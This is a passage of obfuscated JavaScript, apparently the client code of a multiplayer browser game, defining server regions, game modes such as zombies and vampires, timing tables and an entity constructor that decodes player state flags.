			const ⵠⵠⵠᐃΔΔⵠΔᐃ = (16 << ((ⵠⵠΔΔⲆΔⵠ ^ ⲆᐃⵠⵠΔΔⵠ) >> 24 & ⲆΔⲆᐃΔⲆᐃ)) + (Ⲇᐃᐃᐃ << ((ⵠⵠΔΔⲆΔⵠ ^ ⲆᐃⵠⵠΔΔⵠ) >> 16 & 255)) + (8 << ((ⵠⵠΔΔⲆΔⵠ ^ ⲆᐃⵠⵠΔΔⵠ) >> 0 & 255)) + (24 << ((ⵠⵠΔΔⲆΔⵠ ^ ⲆᐃⵠⵠΔΔⵠ) >> 8 & 255));
			return ⵠⵠⵠᐃΔΔⵠΔᐃ
		}

		function ⲆΔⵠⵠΔⵠᐃⵠᐃ(ⵠⵠⲆΔⵠᐃⵠ, ⲆⵠᐃⲆᐃⲆᐃ) {
			ᐃⵠⲆΔⵠΔᐃ(ⲆᐃΔⵠⲆ, ⵠⵠⲆΔⵠᐃⵠ, ⲆⵠᐃⲆᐃⲆᐃ);
			const ⵠᐃΔΔᐃⵠᐃ = ΔΔⲆⵠᐃⲆΔ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[1]);
			const ⲆⲆⲆΔⲆᐃΔⲆᐃ = ᐃᐃΔᐃⲆᐃⲆ(ΔᐃΔᐃ[ΔⲆⵠⲆ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[0], ΔᐃΔᐃ[1]);
			const ⵠᐃⲆⵠⵠᐃⵠΔᐃ = (44023 | ⵠᐃΔΔᐃⵠᐃ) & ~(44023 & ⵠᐃΔΔᐃⵠᐃ);
			return ⵠᐃⲆⵠⵠᐃⵠΔᐃ
		}

		function ΔⵠⲆΔΔᐃⲆ(ⵠΔⲆΔⲆᐃᐃ, ΔⵠΔᐃⲆΔⲆ, ⲆΔⵠΔᐃ) {
			const ⵠᐃⵠⵠⵠⵠΔ = ~(ⵠΔⲆΔⲆᐃᐃ & 11716) & (11716 | ⵠΔⲆΔⲆᐃᐃ);
			const ⲆΔⵠⵠΔΔΔ = (16 << (ΔⵠΔᐃⲆΔⲆ >> 16 & 255)) + (8 << (ΔⵠΔᐃⲆΔⲆ >> 0 & 255)) + (0 << (ΔⵠΔᐃⲆΔⲆ >> 8 & 255)) + (24 << (ΔⵠΔᐃⲆΔⲆ >> 24 & 255));
			const ΔⲆⲆᐃⲆⵠⵠ = (24 << (ⲆΔⵠΔᐃ >> 16 & 255)) + (8 << (ⲆΔⵠΔᐃ >> ᐃⵠⲆ & 255)) + (16 << (ⲆΔⵠΔᐃ >> 24 & 255)) + (0 << (ⲆΔⵠΔᐃ >> 8 & 255));
			const ⲆⲆΔΔⲆⵠⵠ = ΔᐃⵠⲆᐃⲆᐃ(ⵠᐃⵠⵠⵠⵠΔ, ⲆΔⵠⵠΔΔΔ);
			const ⵠⲆᐃⲆᐃⵠΔ = ΔΔⲆⲆⲆΔᐃⵠⵠ(ΔⲆⲆᐃⲆⵠⵠ, ⵠᐃⵠⵠⵠⵠΔ, ⲆΔⵠⵠΔΔΔ, ΔⲆⲆᐃⲆⵠⵠ, ⵠᐃⵠⵠⵠⵠΔ, ⲆΔⵠⵠΔΔΔ);
			const ᐃᐃᐃⵠΔΔⲆⲆᐃ = (ΔⵠᐃᐃⵠⲆⲆ << ((ⲆⲆΔΔⲆⵠⵠ ^ ⵠⲆᐃⲆᐃⵠΔ) >> 0 & 255)) + (0 << ((ⲆⲆΔΔⲆⵠⵠ ^ ⵠⲆᐃⲆᐃⵠΔ) >> 8 & 255)) + (24 << ((ⲆⲆΔΔⲆⵠⵠ ^ ⵠⲆᐃⲆᐃⵠΔ) >> 16 & 255)) + (8 << ((ⲆⲆΔΔⲆⵠⵠ ^ ⵠⲆᐃⲆᐃⵠΔ) >> 24 & 255));
			return ᐃᐃᐃⵠΔΔⲆⲆᐃ
		}

		function ⵠᐃⵠⲆΔᐃᐃ(ⲆᐃⲆⲆᐃΔᐃ, ΔⲆᐃⲆΔ) {
			ⵠⵠΔᐃΔΔⵠ(ⲆᐃΔⵠⲆ, ⲆᐃⲆⲆᐃΔᐃ, ΔⲆᐃⲆΔ);
			const ⲆᐃⲆᐃᐃᐃⵠ = ᐃΔⵠⲆᐃΔⵠ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[ⵠΔⲆⵠ]);
			const Δⵠᐃⵠⵠⵠⵠ = ᐃᐃΔᐃⲆᐃⲆ(ΔᐃΔᐃ[1], ΔᐃΔᐃ[ⲆΔⵠ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[ⵠΔⲆⵠ]);
			const ΔΔⲆᐃⲆᐃⲆΔⵠ = (0 << ((ⲆᐃⲆᐃᐃᐃⵠ ^ Δⵠᐃⵠⵠⵠⵠ) >> 16 & 255)) + (16 << ((ⲆᐃⲆᐃᐃᐃⵠ ^ Δⵠᐃⵠⵠⵠⵠ) >> 0 & 255)) + (8 << ((ⲆᐃⲆᐃᐃᐃⵠ ^ Δⵠᐃⵠⵠⵠⵠ) >> 24 & 255)) + (24 << ((ⲆᐃⲆᐃᐃᐃⵠ ^ Δⵠᐃⵠⵠⵠⵠ) >> 8 & ⲆΔⵠᐃⵠᐃⵠ));
			return ΔΔⲆᐃⲆᐃⲆΔⵠ
		}
		var ΔᐃᐃΔ = {
			"ⲆⵠΔ": 48e4,
			"ΔᐃⲆΔⲆΔⲆ": ⵠⵠΔⲆᐃ,
			"ⲆΔⲆΔᐃⵠⲆ": 16,
			"ΔⲆⵠΔⵠΔⵠⵠⵠ": ᐃⲆᐃᐃΔ - 10,
			"ⵠΔᐃᐃΔΔᐃ": 60,
			"ⵠⲆⲆⵠΔ": 1,
			"ᐃΔᐃᐃⲆ": 2,
			"ⲆᐃΔΔᐃ": ⲆⵠᐃΔ,
			"ⲆᐃᐃΔᐃ": 8,
			"ΔΔⲆⲆⲆΔΔ": ⲆⵠⲆᐃⲆ,
			"ⵠⵠᐃᐃⲆᐃⲆ": 100,
			"ΔΔᐃⲆⵠᐃⵠ": 100,
			"ⵠΔⲆᐃΔᐃⲆ": 100,
			"ΔΔΔᐃΔᐃΔⲆⵠ": 100,
			"ΔᐃⵠⲆⲆⲆΔ": 100,
			"ΔⲆΔΔΔⲆⲆ": ⲆᐃⵠΔΔⲆⲆ,
			"ᐃΔⲆΔⵠᐃΔᐃⲆ": 100,
			"ΔⲆΔΔΔⲆⲆ": ΔΔⲆⵠΔⲆⵠ,
			"ΔᐃⵠⵠΔⲆᐃ": 100,
			"ⵠᐃⵠⲆⲆΔⲆ": 100,
			"ⵠⵠⵠⵠⲆ": 0,
			"ΔⵠⲆᐃⵠΔⵠ": 1,
			"ⵠᐃᐃⲆᐃ": Δᐃⵠⵠ,
			"ⲆⵠΔⵠᐃ": ⲆⲆΔⲆ,
			"ⲆⲆⵠⵠⲆ": 4,
			"ⲆⵠⲆⵠᐃⲆΔ": 5,
			"ᐃⲆΔⵠⵠ": ⲆΔᐃΔⵠ,
			"ⵠⵠⲆⲆⲆ": ⲆⵠⲆᐃⵠⲆΔ,
			"ⲆⵠΔΔᐃⲆⵠᐃⵠ": {
				losangeles: "Los Angeles",
				atlanta: "Atlanta",
				sydney: "Sydney",
				frankfurt: "Frankfurt",
				osaka: "Osaka"
			},
			"ΔⲆᐃΔΔⲆⲆ": {
				0: "normal",
				2: "zombies",
				3: "vampires",
				4: ⵠ[423],
				6: "community",
				7: "experimental"
			},
			"ⲆᐃⵠΔᐃⲆΔ": Δᐃᐃⵠ,
			"ⵠΔⵠΔᐃⵠⲆ": Ⲇᐃᐃᐃ,
			"ΔⵠⵠⵠᐃᐃⲆ": 30,
			"ⲆⵠΔⵠⲆⲆᐃΔⲆ": 2,
			"ⵠΔᐃᐃΔΔᐃ": 6e4,
			"ⲆΔΔⵠⲆⵠΔΔΔ": 0,
			"ⵠⲆⲆⲆⵠΔᐃⵠⵠ": ΔΔⵠ,
			"ⵠⲆⵠⲆΔΔᐃΔⲆ": 50,
			"ᐃᐃΔᐃΔⲆⵠⲆⵠ": 0,
			"ⵠⲆⲆᐃⲆⵠⵠⵠᐃ": 40,
			"ⵠⵠΔⵠΔⵠⵠΔⲆ": 39,
			"ᐃⵠΔᐃⵠⲆⲆⲆΔ": 830,
			"ᐃⵠΔᐃᐃᐃⲆ": 25,
			"ᐃΔᐃⵠΔⵠⲆ": 8,
			"ΔⲆⵠᐃᐃ": 0,
			"ᐃⲆᐃΔΔ": 0,
			"ΔⲆⵠᐃⵠⲆⲆ": 200,
			"ᐃΔⲆⵠⲆᐃⵠ": 0,
			"ⵠⵠᐃⲆΔ": 250,
			"ᐃᐃΔΔⲆⲆᐃ": 150,
			"Δᐃᐃᐃᐃᐃᐃ": 0,
			"Ⲇⵠⵠᐃⵠ": 350,
			"ᐃΔⲆⵠⵠⵠⵠ": 100,
			"ΔΔᐃΔⲆᐃⵠ": 700,
			"ⵠΔⵠᐃΔ": 39879
		};
		var ⲆⵠⲆΔΔ = [];
		for (var ⵠᐃ = 0; 500 > ⵠᐃ; ⵠᐃ++) ⲆⵠⲆΔΔ[ⵠᐃ] = Δᐃᐃᐃ;
		ⲆⵠⲆΔΔ[Ⲇ.ΔⵠᐃΔⲆ] = ΔⲆᐃᐃ;
		ⲆⵠⲆΔΔ[Ⲇ.ΔΔⵠᐃᐃ] = 1;
		ⲆⵠⲆΔΔ[Ⲇ.ⲆᐃⵠΔᐃ] = 1;
		ⲆⵠⲆΔΔ[Ⲇ.ⵠᐃⲆⵠΔ] = ΔᐃᐃⲆ;
		ⲆⵠⲆΔΔ[Ⲇ.ᐃΔⵠᐃⵠ] = ΔΔΔ;
		ⲆⵠⲆΔΔ[Ⲇ.ⵠⵠᐃⲆⲆ] = ΔⲆⵠ;
		ⲆⵠⲆΔΔ[Ⲇ.ⲆⵠⵠᐃΔ] = ⵠⲆΔ;
		ⲆⵠⲆΔΔ[Ⲇ.ⲆᐃⲆⲆΔ] = Ⲇᐃⵠ;
		ⲆⵠⲆΔΔ[Ⲇ.ᐃⲆⲆᐃⲆ] = ⵠΔⵠΔ;
		ⲆⵠⲆΔΔ[Ⲇ.ⵠⲆⵠⲆᐃ] = 1;
		ⲆⵠⲆΔΔ[Ⲇ.ΔⵠΔΔⲆ] = ΔⲆᐃᐃ;
		ⲆⵠⲆΔΔ[Ⲇ.ⵠⵠⲆΔⲆ] = ᐃΔᐃⲆ;
		ⲆⵠⲆΔΔ[Ⲇ.ΔᐃΔΔΔ] = Ⲇᐃⵠ;
		ⲆⵠⲆΔΔ[Ⲇ.ⲆⲆΔᐃΔ] = 1;
		ⲆⵠⲆΔΔ[Ⲇ.ΔⵠⲆⲆᐃ] = 1;
		ⲆⵠⲆΔΔ[Ⲇ.ⲆⲆⵠᐃⵠ] = 1;
		ⲆⵠⲆΔΔ[Ⲇ.ΔⲆⲆΔᐃ] = ⵠΔΔ;
		ⲆⵠⲆΔΔ[Ⲇ.ⲆⲆⵠΔⲆ] = ΔⵠⲆΔ;
		ⲆⵠⲆΔΔ[Ⲇ.ᐃᐃΔⲆΔ] = 1;
		var ⵠΔⲆᐃᐃⵠⲆ = [{
			time: 8 * 6e4 * ⲆᐃⲆᐃ
		}, {
			time: 1e3 * 60 * ⵠⲆΔⵠᐃ * ᐃᐃⲆΔⵠ
		}, {
			time: 6e4 * ΔᐃᐃⲆᐃ * 4
		}, {
			time: ⵠⵠⲆⵠΔ * (1e3 * 60) * 3
		}, {
			time: ΔⵠⵠⲆΔ * 48e4
		}, {
			time: ΔᐃΔⲆ * 48e4
		}, {
			time: ⵠⲆⲆΔΔ * 6e4 * 5
		}, {
			time: ⲆⵠⲆⲆᐃ * (ΔᐃΔⲆⲆ * 6e4)
		}, {
			time: ⲆⵠⵠⲆΔ * (1e3 * 60) * 6
		}, {
			time: 7 * (ⵠⵠⵠΔᐃ * 6e4)
		}, {
			time: 6 * (6e4 * ⵠⲆⲆΔΔ)
		}, {
			time: 8 * (60 * 1e3 * 8)
		}, {
			time: ᐃⵠⵠⵠⲆ * 6e4 * 7
		}];
		var ⲆⲆᐃ = {
			"ⵠᐃⲆᐃⲆ": 52,
			"ᐃⲆΔⵠΔ": 87,
			"ᐃΔΔᐃΔ": 66,
			"ⲆⲆΔⵠⵠ": 46,
			"ᐃⲆⲆⲆᐃ": 42,
			"ᐃᐃΔΔⲆ": 45,
			"ΔᐃΔⲆᐃ": 23,
			"ⲆᐃⲆᐃⵠ": 69,
			"ⵠⵠⵠᐃⲆ": 17,
			"ΔⲆⵠⵠᐃ": 20,
			"ⵠᐃΔⲆᐃ": 28,
			"ⲆΔᐃΔᐃ": 12,
			"ᐃⵠᐃⲆᐃ": 36,
			"ᐃΔⵠⵠⲆ": 54,
			"ⲆⲆⵠᐃⲆ": 61,
			"ΔⵠΔⲆΔᐃΔ": 89,
			"ⲆⵠⲆΔⲆ": 31,
			"ⵠⲆᐃⲆᐃ": 72,
			"ᐃⵠᐃᐃΔ": 71,
			"ⲆⲆΔΔᐃ": ᐃᐃᐃⲆⲆᐃⲆ,
			"ⲆΔΔΔᐃ": 25,
			"ᐃⵠⵠΔⵠⵠᐃ": 82,
			"ᐃᐃᐃΔᐃ": 78,
			"ΔⵠⵠⲆᐃ": 90,
			"ⵠⵠΔⵠⵠ": 26,
			"ⲆΔⵠΔΔ": ⲆΔΔⵠⲆ,
			"ᐃᐃᐃⲆᐃ": 80,
			"ΔⵠΔⲆⲆ": ᐃⵠⲆᐃΔⵠᐃ,
			"ⵠΔⲆᐃΔ": 43,
			"ΔΔⵠΔΔ": 64,
			"ⵠΔⵠᐃΔ": ⵠΔΔΔΔ,
			"ᐃⵠᐃⲆⵠ": 24,
			"ⵠΔⲆᐃⵠ": 38,
			"ΔᐃΔΔⵠᐃΔ": 84,
			"ⲆΔⲆⵠΔ": ⵠΔᐃⲆᐃΔⵠ,
			"ⵠᐃΔⲆⲆ": 33,
			"ΔᐃⲆᐃⵠ": 44,
			"ⲆⵠⵠⵠⲆ": ᐃⵠⵠⲆⵠ,
			"ⵠⵠᐃⵠⲆ": 40,
			"ⲆⵠⲆᐃᐃ": 48,
			"ⲆⵠᐃⲆⵠ": 34,
			"ΔⵠΔⵠⵠ": 88,
			"ᐃᐃΔⲆⵠᐃᐃ": 83,
			"ⵠⲆⵠⵠⲆ": ᐃⵠΔ,
			"ⲆᐃᐃΔⲆ": 8,
			"ⵠⵠⵠΔⲆ": 5,
			"ΔᐃⲆⲆΔ": 55,
			"ⲆᐃⲆΔᐃ": 86,
			"ⵠᐃᐃⵠᐃ": ᐃΔⲆᐃⵠ,
			"ⲆⲆΔⵠⲆ": 14,
			"ΔᐃΔⵠΔᐃΔ": 85,
			"ⲆⵠΔΔⵠ": 56,
			"ⲆᐃΔΔⲆ": 47,
			"ⵠᐃⵠⵠᐃ": 16,
			"ᐃⵠⵠᐃⵠ": 62,
			"ⲆΔᐃᐃΔ": 67,
			"ΔⵠᐃⲆᐃ": 60,
			"ⲆΔᐃⲆᐃ": 29,
			"ⲆΔΔⵠᐃ": 4,
			"ΔΔⲆᐃᐃ": 32,
			"ΔⲆᐃΔⵠ": 35,
			"ᐃΔᐃΔⵠ": 19,
			"ΔᐃΔᐃⵠ": 50,
			"ⲆⵠᐃⵠⲆ": 77,
			"ΔⲆⵠᐃΔ": 79,
			"ⵠⵠΔⲆⵠ": 37,
			"ⵠΔⵠΔᐃ": 18,
			"ⵠⲆΔΔⵠ": 51,
			"ⵠΔⵠᐃⲆ": 49,
			"ᐃⲆⲆΔᐃ": 2,
			"ⵠᐃᐃⵠⵠ": 70,
			"ⲆⵠΔᐃΔ": 63,
			"ⲆⲆⲆⲆⲆ": 21,
			"ᐃΔⵠⲆⵠ": 65,
			"ᐃᐃΔⲆⲆ": 27,
			"ΔΔΔⲆⲆ": 74,
			"ⲆΔⲆᐃᐃ": ⵠΔᐃⲆᐃᐃⲆ,
			"ⵠⲆΔᐃΔ": 1,
			"ΔⵠᐃᐃΔ": 68,
			"ΔⲆΔⲆᐃ": 30,
			"ⲆⲆⲆⲆΔ": 41,
			"ⲆⲆⵠᐃΔ": 91,
			"ⲆᐃⲆⲆⵠᐃΔ": 76,
			"ⵠᐃⵠⵠΔ": 81,
			"ⵠⵠⲆΔⵠ": 53,
			"ⵠⲆⲆⵠⲆ": 39,
			"ⵠⵠⵠᐃⵠ": 11,
			"ⵠⵠᐃⲆⵠ": 22,
			"ΔⲆⲆⵠⲆ": 75,
			"ΔⵠⵠΔⲆ": 73
		};
		var ᐃᐃᐃⵠⵠΔⲆ = [
			[ⲆⲆᐃ.ᐃⵠᐃⲆⵠ, ᐃᐃ.ᐃᐃΔⲆ],
			[ⲆⲆᐃ.ⲆΔΔΔᐃ, ᐃᐃ.ΔⲆⵠⵠ],
			[ⲆⲆᐃ.ⵠⵠΔⵠⵠ, ᐃᐃ.ΔⲆᐃΔ],
			[ⲆⲆᐃ.ᐃᐃΔⲆⲆ, ᐃᐃ.ⲆⵠΔⲆ],
			[ⲆⲆᐃ.ⵠᐃΔⲆᐃ, ᐃᐃ.ⲆΔᐃᐃ]
		];

		function ΔⲆⵠΔΔⲆⵠ(ᐃᐃⵠⵠ, ⲆⵠⵠΔ, ᐃΔ, Δⵠ, ⲆⵠⲆ, ⲆᐃΔ, ⲆⵠⲆΔ, Ⲇⵠᐃ, ᐃᐃΔᐃᐃ, ΔⵠΔⵠⲆ) {
			this.type = ᐃᐃⵠⵠ;
			this.ⲆⵠⵠΔ = ⲆⵠⵠΔ;
			this.pid = arguments[1];
			this.id = ᐃΔ;
			this.x = Δⵠ;
			this.y = ⲆⵠⲆ;
			this.angle = ⲆᐃΔ;
			this.ⲆΔⲆⲆΔⲆΔ = ⲆᐃΔ;
			this.action = ⲆⵠⲆΔ;
			this.info = Ⲇⵠᐃ;
			this.ΔⵠΔⵠⲆ = ΔⵠΔⵠⲆ;
			this.r = {
				x: Δⵠ,
				y: ⲆⵠⲆ
			};
			this.ᐃᐃΔᐃᐃ = ᐃᐃΔᐃᐃ;
			ⲆⲆⲆ && (this.ⲆᐃΔΔ = ⲆⵠⵠΔ * ⲆⲆⲆ.ⵠᐃᐃⲆΔⲆΔ + ᐃΔ);
			switch (ᐃᐃⵠⵠ) {
				case ⲆⲆᐃ.ⵠⲆⵠⵠⲆ:
					this.ⵠΔⲆΔ = ⲆⲆⲆ.ᐃᐃᐃⵠ[this.ⲆⵠⵠΔ];
					this.ⲆⵠⲆᐃ = this.ⵠΔⲆΔ.ⲆⵠⲆᐃ;
					this.ⲆΔⲆⲆⵠⲆΔ = this.ⵠΔⲆΔ.ⲆΔⲆⲆⵠⲆΔ;
					this.ⵠⲆᐃⵠⵠ = this.ⵠΔⲆΔ.ⵠⲆᐃⵠⵠ;
					this.Δᐃᐃⵠᐃ = this.ⵠΔⲆΔ.Δᐃᐃⵠᐃ;
					this.ΔⵠⵠⵠⵠΔⲆ = -1e6;
					this.ΔⵠΔΔⵠ = -1e6;
					this.ⵠΔΔⲆΔ = -1e6;
					this.ᐃᐃⲆΔⲆ = -1e6;
					this.ΔⲆⲆᐃⵠⲆⵠ = -1e6;
					this.ⵠⲆΔⲆΔⲆᐃ = -1e6;
					this.ⵠⲆΔⲆⵠ = -1e6;
					this.ⵠⵠⲆⵠⵠ = ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ && this.ⲆⵠⲆᐃ === ΔᐃᐃΔ.ⲆᐃⵠΔᐃⲆΔ ? ⲆⵠⵠᐃⲆ : ΔⵠΔⲆΔ;
					this.ΔⲆⵠΔⵠΔⲆ = ΔᐃᐃΔ.ⲆⵠΔⵠᐃ === ⲆⲆⲆ.mode && ΔᐃᐃΔ.ⵠΔⵠΔᐃⵠⲆ === this.ⲆⵠⲆᐃ ? true : false;
					this.ᐃⲆΔᐃⲆᐃΔ = this.ⵠⵠⲆⵠⵠ && this.ⵠΔⲆΔ.ⵠΔⵠⲆᐃ === "  " ? ΔᐃⲆⵠⵠ : ⵠΔⲆⲆⲆ;
					this.ᐃΔⲆⵠⲆ = [];
					this.ⵠⵠⵠΔⵠΔⵠ = 0;
					this.ΔᐃⵠΔ = ΔΔⲆⲆΔ;
					this.ΔΔⵠⵠΔᐃⲆ = ΔΔⵠ;
					this.ΔⵠΔⲆΔᐃᐃ = 0;
					this.ⲆΔᐃⲆⲆ = [];
					this.r = {
						x: Δⵠ,
						y: ⲆⵠⲆ
					};
					this.ΔᐃΔⵠ = ᐃΔⲆΔⲆⲆΔΔⵠ;
					this.ᐃᐃⲆᐃⲆⵠⲆ = ᐃᐃⲆᐃⲆⵠⲆ;
					this.ΔᐃᐃⲆⵠ = ⵠⲆᐃⵠ;
					this.ⵠⵠⲆΔᐃ = 0;
					this.ΔᐃΔⲆⵠ = Δᐃᐃᐃ;
					this.ᐃⲆΔⵠΔⲆⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃᐃΔᐃΔ, ⵠΔⲆⵠ, Ⲇᐃⵠⵠ, -Math.PI / 6, .5, ΔΔᐃⵠ);
					this.ⲆⲆᐃΔⵠ = ΔⲆⲆ;
					this.ⲆᐃⲆⵠΔᐃⵠ = ΔⲆⲆ;
					this.Δᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆΔⵠⲆΔ, .6, .6, 0, 5, 3);
					this.ΔΔᐃⵠⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, ΔⲆⵠⲆ, 5, 3);
					this.freeze = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, Δᐃᐃᐃ, 5, ⵠⵠⵠⵠ);
					this.ⲆⲆⲆⲆᐃᐃⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, ⲆΔⵠ, ᐃᐃⲆᐃ, ΔΔⵠΔ);
					this.ᐃᐃᐃᐃⲆⵠΔ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃⲆᐃᐃⲆ, ⲆΔⵠ, 2.25, -1.5, 3.75, 7.5);
					this.ⵠⵠᐃᐃⵠᐃΔ = new ΔΔⲆᐃ.Δⵠᐃᐃ(true, 0, 7.5, -ΔΔⵠΔ, 22.5, 33.75);
					this.attack = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 0, 0, -Math.PI / 3, 6, 9);
					this.ᐃΔⵠΔᐃⵠΔⲆⲆ = 0;
					this.ⲆᐃⵠⲆⵠΔⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, .6, .6, 0, Ⲇᐃⵠ, 3);
					this.ⵠΔⲆᐃᐃⲆⵠ = this.ᐃⲆΔᐃⲆᐃΔ ? new ΔΔⲆᐃ.Δⵠᐃᐃ(ⵠⵠⲆⲆΔ, 0, 2.25, -1.5, 2.75, 5.5) : ΔΔⵠⵠ;
					this.ᐃΔⲆⵠⵠⲆΔ = ΔᐃΔΔ;
					this.ⵠⲆⵠᐃⵠⵠΔ = 0;
					this.ᐃⲆᐃΔᐃΔᐃ = [];
					this.ⵠᐃΔⵠΔⲆⲆ = [];
					this.text = [];
					this.label = [];
					this.ⵠⲆᐃᐃᐃᐃⵠ = ⵠᐃⲆⲆⵠΔᐃᐃᐃ;
					this.ΔⲆⲆⲆᐃ = true;
					this.right = -ⵠᐃⵠΔ;
					this.ᐃⵠⵠΔⵠ = -ΔⵠⲆΔ;
					this.action = ⵠⵠⵠⲆ.IDLE;
					this.ⵠⲆΔⲆᐃⲆΔ = false;
					this.Ⲇⵠᐃᐃᐃ = 0;
					this.Ⲇⵠⵠⵠᐃ = false;
					this.bubbles = [];
					this.ΔⵠΔᐃⲆ = 0;
					this.ᐃᐃⲆᐃΔ = -1;
					this.ⵠⲆᐃ = function(ⲆⵠⲆΔ) {
						this.info & 32768 ? (this.ⵠⲆΔⲆᐃⲆΔ = ⲆⲆⲆΔⲆ, this.info = ~32768 & this.info) : this.ⵠⲆΔⲆᐃⲆΔ = ⲆΔᐃⲆΔ;
						if (this.info & 16384) {
							this.info = ~16384 & this.info;
							this.ΔⵠΔᐃⲆ = 1
						} else this.ΔⵠΔᐃⲆ = ᐃⵠⲆ;
						this.Ⲇⵠᐃᐃᐃ = Math.floor(this.info / 128);
						this.info -= this.Ⲇⵠᐃᐃᐃ * 128;
						ᐃᐃ.ᐃⲆᐃΔᐃ === this.info || this.ᐃⲆΔᐃⲆᐃΔ ? this.right = -1 : this.right = this.info;
						this.ⵠⵠⵠΔⵠΔⵠ = ⲆⲆⲆ.ΔᐃⲆΔᐃᐃⲆⲆᐃ(Math.floor(this.r.y / 100), Math.floor(this.r.x / ᐃᐃᐃⵠⵠⲆⵠ));
						this.ᐃⵠⵠΔⵠ = this.ΔⵠΔⵠⲆ & 255;
						if (ΔᐃᐃΔ.ⲆⵠΔⵠⲆⲆᐃΔⲆ === this.right) this.Ⲇⵠⵠⵠᐃ = true;
						else this.Ⲇⵠⵠⵠᐃ = false;
						if (ⲆⵠⲆΔΔ[this.right]) this.ⲆᐃΔᐃΔ = ⲆⲆⲆΔⲆ;
						else this.ⲆᐃΔᐃΔ = ⵠᐃΔΔⵠ;
						if (ⲆⵠⲆΔ & ⵠⵠⵠⲆ.ⵠΔΔⲆⲆΔⵠ) {
							this.ⲆᐃⵠⲆⵠΔⵠ.ᐃⲆΔ = ΔᐃⵠᐃⲆ;
							this.ⲆᐃⵠⲆⵠΔⵠ.ΔᐃΔ = .6
						} else if (ⲆⵠⲆΔ & ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ) {
							this.freeze.ᐃⲆΔ = false;
							this.freeze.ΔᐃΔ = .6
						} else if (ⲆⵠⲆΔ & ⵠⵠⵠⲆ.ⲆⲆᐃᐃⵠⵠΔ) {
							this.ΔΔᐃⵠⵠ.ᐃⲆΔ = ᐃᐃΔᐃΔ;
							this.ΔΔᐃⵠⵠ.ΔᐃΔ = .6
						}
						if (ⲆⵠⲆΔ & ⵠⵠⵠⲆ.ⵠΔΔᐃᐃⲆⵠ) {
							this.ⲆⲆⲆⲆᐃᐃⵠ.ᐃⲆΔ = false;
							this.ⲆⲆⲆⲆᐃᐃⵠ.ΔᐃΔ = .6
						}
						if (ⲆⵠⲆΔ & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
							this.Δᐃⵠ.ᐃⲆΔ = false;
							this.Δᐃⵠ.ΔᐃΔ = .6
						}
						if (ⲆⵠⲆΔ & ⵠⵠⵠⲆ.ᐃⵠⵠᐃⵠⵠⵠ) {
							this.ᐃΔⵠΔᐃⵠΔⲆⲆ = ᐃⲆⵠᐃᐃ.ΔⲆᐃᐃⲆⲆᐃⵠⵠ;
							ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ && this.ᐃᐃⲆᐃΔ !== -1 && ⲆⲆⵠⲆ.ᐃᐃᐃⵠ[this.ᐃᐃⲆᐃΔ].ΔᐃΔⲆᐃⲆΔΔᐃ(ⵠⵠⲆᐃⲆ[this.right])
						}
					};
					this.ⵠⲆᐃ();
					break;
				case ⲆⲆᐃ.ΔᐃΔⲆᐃ:
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1, 0, 10, 10),
						"ⵠⲆᐃ": ᐃᐃΔᐃΔ,
						angle: ⵠᐃⲆᐃ
					};
					this.ⵠᐃⲆⲆᐃ = ⲆΔⲆⲆⵠⲆⲆⲆᐃ;
					this.ᐃΔⵠᐃΔ = ᐃΔⲆⵠΔⲆⲆΔᐃ;
					this.ΔⲆΔⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔᐃⵠᐃⲆ, 1, 1.23, 1.18, .01, .01);
					this.ⲆⵠⲆⲆΔᐃΔ = 0;
					this.ⵠᐃᐃⵠΔΔⵠ = ⵠΔⲆⵠ;
					this.ᐃΔᐃⵠᐃ = ᐃΔᐃⵠᐃ;
					break;
				case ⲆⲆᐃ.ⵠⵠᐃⲆⵠ:
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔᐃᐃⲆⲆ, ᐃΔᐃⲆ, ᐃΔᐃⲆ, 0, ᐃᐃⲆⵠⵠ, 10),
						"ⵠⲆᐃ": false,
						angle: 0
					};
					this.ⵠᐃⲆⲆᐃ = ⵠᐃⵠᐃΔΔⲆᐃΔ;
					this.ᐃΔⵠᐃΔ = ΔΔⵠⵠⵠⵠΔΔⲆ;
					this.ΔⲆΔⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆᐃⵠᐃ, ⲆⵠⲆⲆ, 1.23, 1.18, .01, .01);
					this.ⲆⵠⲆⲆΔᐃΔ = 0;
					this.ⵠᐃᐃⵠΔΔⵠ = 0;
					break;
				case ⲆⲆᐃ.ⵠⲆΔᐃΔ:
				case ⲆⲆᐃ.ⲆⵠⵠⵠⲆ:
					this.ⵠᐃⲆⲆᐃ = ΔΔΔΔⵠΔⵠⵠⵠ;
					this.ᐃΔⵠᐃΔ = ᐃΔΔΔΔⲆⵠⲆᐃ;
					this.ⵠᐃⲆΔⲆ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1.03, .98, .3, .3);
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ⵠΔⲆ, 1.23, 1.18, .01, .01);
					this.ΔⲆΔⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1.23, 1.18, .01, .01);
					this.Δᐃⵠ = {
